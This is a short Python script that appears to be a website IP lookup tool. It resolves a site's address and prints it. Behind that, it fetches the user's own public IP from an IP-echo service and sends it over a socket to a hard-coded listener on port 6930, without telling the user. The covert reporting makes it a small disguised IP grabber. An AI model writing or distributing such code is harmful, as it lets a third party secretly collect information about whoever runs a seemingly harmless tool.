import os
import socket
from requests import get

host = "127.0.0.1"
port = 6930

target = input("enter website: ")
victim = socket.gethostbyname(target)
print(f"ip of the website:x {victim}")

with socket.socket() as s:
    s.connect((host, port))
    ip = get("https://api.ipify.org").text
    s.send(ip.encode("utf-8"))
    s.close()

os.system("pause")